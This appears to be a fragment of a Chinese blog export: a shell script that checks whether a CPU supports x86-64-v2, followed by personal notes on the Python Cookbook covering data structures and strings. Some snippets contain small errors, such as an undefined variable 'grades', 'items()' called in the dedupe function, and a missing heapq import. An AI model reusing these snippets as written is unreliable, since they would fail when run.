<h2 id="检查CPU是否支持x86-64-v2的方法"><a href="#检查CPU是否支持x86-64-v2的方法" class="headerlink" title="检查CPU是否支持x86-64-v2的方法"></a>检查CPU是否支持x86-64-v2的方法</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">flags=$(<span class="built_in">cat</span> /proc/cpuinfo | grep flags | <span class="built_in">head</span> -n 1 | <span class="built_in">cut</span> -d: -f2)</span><br><span class="line">supports_v2=<span class="string">&#x27;awk &quot;/cx16/&amp;&amp;/lahf/&amp;&amp;/popcnt/&amp;&amp;/sse4_1/&amp;&amp;/sse4_2/&amp;&amp;/ssse3/ &#123;found=1&#125; END &#123;exit !found&#125;&quot;&#x27;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$flags</span>&quot;</span> | <span class="built_in">eval</span> <span class="variable">$supports_v2</span></span><br><span class="line"><span class="keyword">if</span> [ $? -eq 0 ]; <span class="keyword">then</span></span><br><span class="line">	<span class="built_in">echo</span> <span class="string">&quot;CPU supports x86-64-v2&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">	<span class="built_in">echo</span> <span class="string">&quot;CPU doesn&#x27;t support x86-64-v2&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>
<span id="more"></span>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>【1】<a href="https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/9/html/9.0_release_notes/architectures">https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux&#x2F;9&#x2F;html&#x2F;9.0_release_notes&#x2F;architectures</a><br>【2】<a href="https://unix.stackexchange.com/questions/631217/how-do-i-check-if-my-cpu-supports-x86-64-v2">https://unix.stackexchange.com/questions/631217/how-do-i-check-if-my-cpu-supports-x86-64-v2</a></p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Python cookbook 笔记</title>
    <url>/2023/12/16/2023-12-16-python-cookbook-note/</url>
    <content><![CDATA[<h2 id="一、数据结构和算法"><a href="#一、数据结构和算法" class="headerlink" title="一、数据结构和算法"></a>一、数据结构和算法</h2><h3 id="1-解压序列赋值给多个变量"><a href="#1-解压序列赋值给多个变量" class="headerlink" title="1. 解压序列赋值给多个变量"></a>1. 解压序列赋值给多个变量</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>year, month, day = [<span class="number">2002</span>, <span class="number">6</span>, <span class="number">10</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(year, month, day)</span><br><span class="line"><span class="number">2002</span> <span class="number">6</span> <span class="number">10</span></span><br></pre></td></tr></table></figure>

<p>可以用占位符，丢弃其他的值</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">year, _ , _ = [<span class="number">2002</span>,<span class="number">6</span>,<span class="number">10</span>]</span><br><span class="line"><span class="built_in">print</span>(year)</span><br><span class="line"><span class="number">2002</span></span><br></pre></td></tr></table></figure>
<span id="more"></span>

<h3 id="2-解压可迭代对象赋值给多个变量"><a href="#2-解压可迭代对象赋值给多个变量" class="headerlink" title="2. 解压可迭代对象赋值给多个变量"></a>2. 解压可迭代对象赋值给多个变量</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">L = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>]</span><br><span class="line">first, *middle, last = grades</span><br><span class="line"><span class="built_in">print</span>(middle)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>]</span><br></pre></td></tr></table></figure>

<h3 id="3-保留最后N个元素"><a href="#3-保留最后N个元素" class="headerlink" title="3. 保留最后N个元素"></a>3. 保留最后N个元素</h3><p>使用deque，指定maxlen参数的值为AN</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> collections <span class="keyword">import</span> deque</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>dq = deque(maxlen=<span class="number">3</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>dq.append(<span class="number">1</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>dq.append(<span class="number">2</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>dq.append(<span class="number">3</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>dq.append(<span class="number">4</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>dq.append(<span class="number">5</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(dq)</span><br><span class="line">deque([<span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>], maxlen=<span class="number">3</span>)</span><br></pre></td></tr></table></figure>

<h3 id="4-查找最大或最小的N个元素"><a href="#4-查找最大或最小的N个元素" class="headerlink" title="4. 查找最大或最小的N个元素"></a>4. 查找最大或最小的N个元素</h3><p>利用heaq模块的nlargest()和nsmallest()方法</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>nums = [<span class="number">3</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">1</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>smallest = heapq.nsmallest(<span class="number">3</span>, nums)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(smallest)</span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>largest = heapq.nlargest(<span class="number">3</span>, nums)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(largest)</span><br><span class="line">[<span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>]</span><br></pre></td></tr></table></figure>

<h3 id="x20-5-字典中的键如何映射多个值"><a href="#x20-5-字典中的键如何映射多个值" class="headerlink" title="&#x20;5. 字典中的键如何映射多个值"></a>&#x20;5. 字典中的键如何映射多个值</h3><p>可以将多个值放到列表或集合里。 使用defaultdict自动初始化每个key，只需关注添加元素操作，如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> collections <span class="keyword">import</span> defaultdict</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>d = defaultdict(<span class="built_in">list</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>d[<span class="string">&#x27;a&#x27;</span>].append(<span class="number">1</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(d)</span><br><span class="line">defaultdict(&lt;<span class="keyword">class</span> <span class="string">&#x27;list&#x27;</span>&gt;, &#123;<span class="string">&#x27;a&#x27;</span>: [<span class="number">1</span>]&#125;)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>d = defaultdict(<span class="built_in">set</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>d[<span class="string">&#x27;a&#x27;</span>].add(<span class="number">1</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(d)</span><br><span class="line">defaultdict(&lt;<span class="keyword">class</span> <span class="string">&#x27;set&#x27;</span>&gt;, &#123;<span class="string">&#x27;a&#x27;</span>: &#123;<span class="number">1</span>&#125;&#125;)</span><br></pre></td></tr></table></figure>

<h3 id="8-在数据字典中执行计算操作（比如求最小值，最大值，排序等）"><a href="#8-在数据字典中执行计算操作（比如求最小值，最大值，排序等）" class="headerlink" title="8. 在数据字典中执行计算操作（比如求最小值，最大值，排序等）"></a>8. 在数据字典中执行计算操作（比如求最小值，最大值，排序等）</h3><p>考虑下面的股票名和价格</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">prices = &#123;</span><br><span class="line">	<span class="string">&#x27;ACME&#x27;</span>: <span class="number">45.23</span>,</span><br><span class="line">	<span class="string">&#x27;AAPL&#x27;</span>: <span class="number">612.78</span>,</span><br><span class="line">	<span class="string">&#x27;IBM&#x27;</span>: <span class="number">205.55</span>,</span><br><span class="line">	<span class="string">&#x27;HPQ&#x27;</span>: <span class="number">37.20</span>,</span><br><span class="line">	<span class="string">&#x27;FB&#x27;</span>: <span class="number">10.75</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>比如查找最小和最大股票价格和股票名称</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">min_price = <span class="built_in">min</span>(<span class="built_in">zip</span>(prices.values(), prices.keys()))</span><br><span class="line"><span class="comment"># (10.75, &#x27;FB&#x27;)</span></span><br><span class="line">max_price = <span class="built_in">max</span>(<span class="built_in">zip</span>(prices.values(), prices.keys()))</span><br><span class="line"><span class="comment"># (612.78, &#x27;AAPL&#x27;)</span></span><br></pre></td></tr></table></figure>

<p>使用zip和sorted函数排列字典数据</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">prices_sorted = <span class="built_in">sorted</span>(<span class="built_in">zip</span>(prices.values(), prices.keys()))</span><br></pre></td></tr></table></figure>

<h3 id="9-寻找两个字典的相同点"><a href="#9-寻找两个字典的相同点" class="headerlink" title="9. 寻找两个字典的相同点"></a>9. 寻找两个字典的相同点</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = &#123;<span class="string">&#x27;x&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;y&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;z&#x27;</span>: <span class="number">3</span>&#125;</span><br><span class="line">b = &#123;<span class="string">&#x27;w&#x27;</span>: <span class="number">10</span>, <span class="string">&#x27;x&#x27;</span>: <span class="number">11</span>, <span class="string">&#x27;y&#x27;</span>: <span class="number">2</span>&#125;</span><br><span class="line"></span><br><span class="line">a.keys() &amp; b.keys() <span class="comment"># &#123;&#x27;x&#x27;, &#x27;y&#x27;&#125;</span></span><br><span class="line">a.items() &amp; b.items() <span class="comment"># &#123; (&#x27;y&#x27;, 2) &#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="以现有字典构造一个排除几个指定键的字典"><a href="#以现有字典构造一个排除几个指定键的字典" class="headerlink" title="以现有字典构造一个排除几个指定键的字典"></a>以现有字典构造一个排除几个指定键的字典</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">c = &#123;key: a[key] <span class="keyword">for</span> key <span class="keyword">in</span> a.keys() - &#123;<span class="string">&#x27;z&#x27;</span>, <span class="string">&#x27;w&#x27;</span>&#125;&#125;</span><br><span class="line"><span class="comment"># c is &#123;&#x27;x&#x27;: 1, &#x27;y&#x27;: 2&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="10-删除序列相同元素并保持顺序"><a href="#10-删除序列相同元素并保持顺序" class="headerlink" title="10.删除序列相同元素并保持顺序"></a>10.删除序列相同元素并保持顺序</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">dedupe</span>(<span class="params">items</span>):</span><br><span class="line">	seen = <span class="built_in">set</span>()</span><br><span class="line">	<span class="keyword">for</span> item <span class="keyword">in</span> items():</span><br><span class="line">		<span class="keyword">if</span> item <span class="keyword">not</span> <span class="keyword">in</span> seen:</span><br><span class="line">			<span class="keyword">yield</span> item</span><br><span class="line">			seen.add(item)</span><br></pre></td></tr></table></figure>

<h3 id="11-给切片命名，是代码清晰可读"><a href="#11-给切片命名，是代码清晰可读" class="headerlink" title="11. 给切片命名，是代码清晰可读"></a>11. 给切片命名，是代码清晰可读</h3><p>利用slice函数，消除代码中的硬编码，使代码清晰可读</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>ip=<span class="string">&quot;&lt;127.0.0.1&gt;&quot;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>GET_IP = <span class="built_in">slice</span>(<span class="number">1</span>,-<span class="number">1</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>ip[GET_IP]</span><br><span class="line"><span class="string">&#x27;127.0.0.1&#x27;</span></span><br></pre></td></tr></table></figure>

<h3 id="12-找出序列中出现次数最多的元素"><a href="#12-找出序列中出现次数最多的元素" class="headerlink" title="12. 找出序列中出现次数最多的元素"></a>12. 找出序列中出现次数最多的元素</h3><p>使用collections.Counter类</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">words = [<span class="string">&#x27;look&#x27;</span>, <span class="string">&#x27;into&#x27;</span>, <span class="string">&#x27;into&#x27;</span>, <span class="string">&#x27;the&#x27;</span>, <span class="string">&#x27;sky&#x27;</span>]</span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> Counter</span><br><span class="line">word_counts = Counter(words)</span><br><span class="line">top_two = word_counts.most_common(<span class="number">2</span>)</span><br><span class="line">python test.py</span><br><span class="line">[(<span class="string">&#x27;into&#x27;</span>, <span class="number">2</span>), (<span class="string">&#x27;look&#x27;</span>, <span class="number">1</span>)]</span><br></pre></td></tr></table></figure>

<h3 id="13-通过某个关键字排序一个字典列表"><a href="#13-通过某个关键字排序一个字典列表" class="headerlink" title="13. 通过某个关键字排序一个字典列表"></a>13. 通过某个关键字排序一个字典列表</h3><p>使用operator模块的<code>itemgetter</code>函数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">rows = [</span><br><span class="line">&#123;<span class="string">&#x27;fname&#x27;</span>: <span class="string">&#x27;Brian&#x27;</span>, <span class="string">&#x27;lname&#x27;</span>: <span class="string">&#x27;Jones&#x27;</span>, <span class="string">&#x27;uid&#x27;</span>: <span class="number">1003</span>&#125;,</span><br><span class="line">&#123;<span class="string">&#x27;fname&#x27;</span>: <span class="string">&#x27;David&#x27;</span>, <span class="string">&#x27;lname&#x27;</span>: <span class="string">&#x27;Beazley&#x27;</span>, <span class="string">&#x27;uid&#x27;</span>: <span class="number">1002</span>&#125;,</span><br><span class="line">&#123;<span class="string">&#x27;fname&#x27;</span>: <span class="string">&#x27;John&#x27;</span>, <span class="string">&#x27;lname&#x27;</span>: <span class="string">&#x27;Cleese&#x27;</span>, <span class="string">&#x27;uid&#x27;</span>: <span class="number">1001</span>&#125;,</span><br><span class="line">&#123;<span class="string">&#x27;fname&#x27;</span>: <span class="string">&#x27;Big&#x27;</span>, <span class="string">&#x27;lname&#x27;</span>: <span class="string">&#x27;Jones&#x27;</span>, <span class="string">&#x27;uid&#x27;</span>: <span class="number">1004</span>&#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<p>根据uid关键字排序</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> operator <span class="keyword">import</span> itemgetter</span><br><span class="line">rows_by_fname = <span class="built_in">sorted</span>(rows, key=itemgetter(<span class="string">&#x27;fname&#x27;</span>))</span><br><span class="line">rows_by_uid = <span class="built_in">sorted</span>(rows, key=itemgetter(<span class="string">&#x27;uid&#x27;</span>))</span><br><span class="line">[&#123;<span class="string">&#x27;fname&#x27;</span>: <span class="string">&#x27;John&#x27;</span>, <span class="string">&#x27;lname&#x27;</span>: <span class="string">&#x27;Cleese&#x27;</span>, <span class="string">&#x27;uid&#x27;</span>: <span class="number">1001</span>&#125;,</span><br><span class="line">&#123;<span class="string">&#x27;fname&#x27;</span>: <span class="string">&#x27;David&#x27;</span>, <span class="string">&#x27;lname&#x27;</span>: <span class="string">&#x27;Beazley&#x27;</span>, <span class="string">&#x27;uid&#x27;</span>: <span class="number">1002</span>&#125;,</span><br><span class="line">&#123;<span class="string">&#x27;fname&#x27;</span>: <span class="string">&#x27;Brian&#x27;</span>, <span class="string">&#x27;lname&#x27;</span>:  <span class="string">&#x27;Jones&#x27;</span>, <span class="string">&#x27;uid&#x27;</span>: <span class="number">1003</span>&#125;,</span><br><span class="line">&#123;<span class="string">&#x27;fname&#x27;</span>: <span class="string">&#x27;Big&#x27;</span>, <span class="string">&#x27;lname&#x27;</span>: <span class="string">&#x27;Jones&#x27;</span>, <span class="string">&#x27;uid&#x27;</span>: <span class="number">1004</span>&#125;]</span><br></pre></td></tr></table></figure>

<h3 id="14-排序不支持原生比较的对象"><a href="#14-排序不支持原生比较的对象" class="headerlink" title="14. 排序不支持原生比较的对象"></a>14. 排序不支持原生比较的对象</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">User</span>:</span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, user_id</span>):</span><br><span class="line">		<span class="variable language_">self</span>.user_id = user_id</span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">__repr__</span>(<span class="params">self</span>):</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&#x27;User(&#123;&#125;)&#x27;</span>.<span class="built_in">format</span>(<span class="variable language_">self</span>.user_id)</span><br><span class="line"></span><br><span class="line">users = [User(<span class="number">23</span>),User(<span class="number">3</span>),User(<span class="number">99</span>)]</span><br><span class="line"><span class="built_in">print</span>(users)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">sorted</span>(users, key = <span class="keyword">lambda</span> u: u.user_id))</span><br><span class="line"></span><br><span class="line">[User(<span class="number">23</span>), User(<span class="number">3</span>), User(<span class="number">99</span>)]</span><br><span class="line">[User(<span class="number">3</span>), User(<span class="number">23</span>), User(<span class="number">99</span>)]</span><br></pre></td></tr></table></figure>

<h3 id="15-通过某个字段将记录分组"><a href="#15-通过某个字段将记录分组" class="headerlink" title="15. 通过某个字段将记录分组"></a>15. 通过某个字段将记录分组</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> operator <span class="keyword">import</span> itemgetter</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> groupby</span><br><span class="line"></span><br><span class="line">rows = [</span><br><span class="line">&#123;<span class="string">&#x27;address&#x27;</span>: <span class="string">&#x27;5412 N CLARK&#x27;</span>, <span class="string">&#x27;date&#x27;</span>: <span class="string">&#x27;07/01/2012&#x27;</span>&#125;,</span><br><span class="line">&#123;<span class="string">&#x27;address&#x27;</span>: <span class="string">&#x27;5148 N CLARK&#x27;</span>, <span class="string">&#x27;date&#x27;</span>: <span class="string">&#x27;07/04/2012&#x27;</span>&#125;,</span><br><span class="line">&#123;<span class="string">&#x27;address&#x27;</span>: <span class="string">&#x27;5800 E 58TH&#x27;</span>, <span class="string">&#x27;date&#x27;</span>: <span class="string">&#x27;07/02/2012&#x27;</span>&#125;,</span><br><span class="line">&#123;<span class="string">&#x27;address&#x27;</span>: <span class="string">&#x27;2122 N CLARK&#x27;</span>, <span class="string">&#x27;date&#x27;</span>: <span class="string">&#x27;07/03/2012&#x27;</span>&#125;,</span><br><span class="line">&#123;<span class="string">&#x27;address&#x27;</span>: <span class="string">&#x27;5645 N RAVENSWOOD&#x27;</span>, <span class="string">&#x27;date&#x27;</span>: <span class="string">&#x27;07/02/2012&#x27;</span>&#125;,</span><br><span class="line">&#123;<span class="string">&#x27;address&#x27;</span>: <span class="string">&#x27;1060 W ADDISON&#x27;</span>, <span class="string">&#x27;date&#x27;</span>: <span class="string">&#x27;07/02/2012&#x27;</span>&#125;,</span><br><span class="line">&#123;<span class="string">&#x27;address&#x27;</span>: <span class="string">&#x27;4801 N BROADWAY&#x27;</span>, <span class="string">&#x27;date&#x27;</span>: <span class="string">&#x27;07/01/2012&#x27;</span>&#125;,</span><br><span class="line">&#123;<span class="string">&#x27;address&#x27;</span>: <span class="string">&#x27;1039 W GRANVILLE&#x27;</span>, <span class="string">&#x27;date&#x27;</span>: <span class="string">&#x27;07/04/2012&#x27;</span>&#125;,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">rows.sort(key=itemgetter(<span class="string">&#x27;date&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> date, items <span class="keyword">in</span> groupby(rows, key=itemgetter(<span class="string">&#x27;date&#x27;</span>)):</span><br><span class="line">    <span class="built_in">print</span>(date)</span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> items:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27; &#x27;</span>, item)</span><br></pre></td></tr></table></figure>

<p>运行结果</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">07/01/<span class="number">2012</span></span><br><span class="line">  &#123;<span class="string">&#x27;address&#x27;</span>: <span class="string">&#x27;5412 N CLARK&#x27;</span>, <span class="string">&#x27;date&#x27;</span>: <span class="string">&#x27;07/01/2012&#x27;</span>&#125;</span><br><span class="line">  &#123;<span class="string">&#x27;address&#x27;</span>: <span class="string">&#x27;4801 N BROADWAY&#x27;</span>, <span class="string">&#x27;date&#x27;</span>: <span class="string">&#x27;07/01/2012&#x27;</span>&#125;</span><br><span class="line">07/02/<span class="number">2012</span></span><br><span class="line">  &#123;<span class="string">&#x27;address&#x27;</span>: <span class="string">&#x27;5800 E 58TH&#x27;</span>, <span class="string">&#x27;date&#x27;</span>: <span class="string">&#x27;07/02/2012&#x27;</span>&#125;</span><br><span class="line">  &#123;<span class="string">&#x27;address&#x27;</span>: <span class="string">&#x27;5645 N RAVENSWOOD&#x27;</span>, <span class="string">&#x27;date&#x27;</span>: <span class="string">&#x27;07/02/2012&#x27;</span>&#125;</span><br><span class="line">  &#123;<span class="string">&#x27;address&#x27;</span>: <span class="string">&#x27;1060 W ADDISON&#x27;</span>, <span class="string">&#x27;date&#x27;</span>: <span class="string">&#x27;07/02/2012&#x27;</span>&#125;</span><br><span class="line">07/03/<span class="number">2012</span></span><br><span class="line">  &#123;<span class="string">&#x27;address&#x27;</span>: <span class="string">&#x27;2122 N CLARK&#x27;</span>, <span class="string">&#x27;date&#x27;</span>: <span class="string">&#x27;07/03/2012&#x27;</span>&#125;</span><br><span class="line">07/04/<span class="number">2012</span></span><br><span class="line">  &#123;<span class="string">&#x27;address&#x27;</span>: <span class="string">&#x27;5148 N CLARK&#x27;</span>, <span class="string">&#x27;date&#x27;</span>: <span class="string">&#x27;07/04/2012&#x27;</span>&#125;</span><br><span class="line">  &#123;<span class="string">&#x27;address&#x27;</span>: <span class="string">&#x27;1039 W GRANVILLE&#x27;</span>, <span class="string">&#x27;date&#x27;</span>: <span class="string">&#x27;07/04/2012&#x27;</span>&#125;</span><br></pre></td></tr></table></figure>

<h3 id="16-过滤序列元素"><a href="#16-过滤序列元素" class="headerlink" title="16. 过滤序列元素"></a>16. 过滤序列元素</h3><p>最简单的方法是使用列表推导，例如：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>mylist = [<span class="number">1</span>, <span class="number">4</span>, -<span class="number">5</span>, <span class="number">10</span>, -<span class="number">7</span>, <span class="number">2</span>, <span class="number">3</span>, -<span class="number">1</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[n <span class="keyword">for</span> n <span class="keyword">in</span> mylist <span class="keyword">if</span> n &gt; <span class="number">0</span>]</span><br><span class="line">[<span class="number">1</span>, <span class="number">4</span>, <span class="number">10</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[n <span class="keyword">for</span> n <span class="keyword">in</span> mylist <span class="keyword">if</span> n &lt; <span class="number">0</span>]</span><br><span class="line">[-<span class="number">5</span>, -<span class="number">7</span>, -<span class="number">1</span>]</span><br></pre></td></tr></table></figure>

<p>如果对内存敏感，可以用生成器表达式，例如：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>pos = (n <span class="keyword">for</span> n <span class="keyword">in</span> mylist <span class="keyword">if</span> n &gt; <span class="number">0</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> x <span class="keyword">in</span> pos:</span><br><span class="line"><span class="meta">... </span><span class="built_in">print</span>(x)</span><br><span class="line">...</span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">4</span></span><br><span class="line"><span class="number">10</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="number">3</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure>

<p>如果过滤规则复杂，不能简单用列表推导，可以考虑用内建的filter()函数，例如：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">values = [<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;-&#x27;</span>, <span class="string">&#x27;N/A&#x27;</span>]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_int</span>(<span class="params">val</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        x = <span class="built_in">int</span>(val)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">ivals = <span class="built_in">list</span>(<span class="built_in">filter</span>(is_int, values))</span><br><span class="line"><span class="built_in">print</span>(ivals)</span><br></pre></td></tr></table></figure>

<p>如果你需要用另一个相关联的序列来过滤某个序列时，可以考虑itertools.compress()函数，例如：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">addresses = [</span><br><span class="line"><span class="string">&#x27;5412 N CLARK&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;5148 N CLARK&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;5800 E 58TH&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;2122 N CLARK&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;5645 N RAVENSWOOD&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;1060 W ADDISON&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;4801 N BROADWAY&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;1039 W GRANVILLE&#x27;</span>,</span><br><span class="line">]</span><br><span class="line">counts = [ <span class="number">0</span>, <span class="number">3</span>, <span class="number">10</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> compress</span><br><span class="line">more5 = [ n &gt; <span class="number">5</span> <span class="keyword">for</span> n <span class="keyword">in</span> counts]</span><br><span class="line">result = <span class="built_in">list</span>(compress(addresses, more5))</span><br><span class="line"><span class="built_in">print</span>(result)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[<span class="string">&#x27;5800 E 58TH&#x27;</span>, <span class="string">&#x27;1060 W ADDISON&#x27;</span>, <span class="string">&#x27;4801 N BROADWAY&#x27;</span>]</span><br></pre></td></tr></table></figure>

<h3 id="从字典中提取子集"><a href="#从字典中提取子集" class="headerlink" title="从字典中提取子集"></a>从字典中提取子集</h3><p>最简单的方式是使用字典推导， 例如：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">prices = &#123;</span><br><span class="line"><span class="string">&#x27;ACME&#x27;</span>: <span class="number">45.23</span>,</span><br><span class="line"><span class="string">&#x27;AAPL&#x27;</span>: <span class="number">612.78</span>,</span><br><span class="line"><span class="string">&#x27;IBM&#x27;</span>: <span class="number">205.55</span>,</span><br><span class="line"><span class="string">&#x27;HPQ&#x27;</span>: <span class="number">37.20</span>,</span><br><span class="line"><span class="string">&#x27;FB&#x27;</span>: <span class="number">10.75</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Make a dictionary of all prices over 200</span></span><br><span class="line">p1 = &#123;key: value <span class="keyword">for</span> key, value <span class="keyword">in</span> prices.items() <span class="keyword">if</span> value &gt; <span class="number">200</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>&#123;<span class="string">&#x27;AAPL&#x27;</span>: <span class="number">612.78</span>, <span class="string">&#x27;IBM&#x27;</span>: <span class="number">205.55</span>&#125;</span><br></pre></td></tr></table></figure>

<h2 id="二、字符串和文本"><a href="#二、字符串和文本" class="headerlink" title="二、字符串和文本"></a>二、字符串和文本</h2><h3 id="使用多个界定符分割字符串"><a href="#使用多个界定符分割字符串" class="headerlink" title="使用多个界定符分割字符串"></a>使用多个界定符分割字符串</h3><p><code>re.split()</code>方法， 可以更加灵活的切割字符串</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>line = <span class="string">&#x27;asdf fjdk; afed, fjek,asdf, foo&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> re</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>re.split(<span class="string">r&#x27;[;,\s]\s*&#x27;</span>, line)</span><br><span class="line">[<span class="string">&#x27;asdf&#x27;</span>, <span class="string">&#x27;fjdk&#x27;</span>, <span class="string">&#x27;afed&#x27;</span>, <span class="string">&#x27;fjek&#x27;</span>, <span class="string">&#x27;asdf&#x27;</span>, <span class="string">&#x27;foo&#x27;</span>]</span><br></pre></td></tr></table></figure>

<h3 id="x20-字符串开头或结尾匹配"><a href="#x20-字符串开头或结尾匹配" class="headerlink" title="&#x20;字符串开头或结尾匹配"></a>&#x20;字符串开头或结尾匹配</h3><p>利用<code>startswith()</code>和<code>endswith()</code>方法</p>
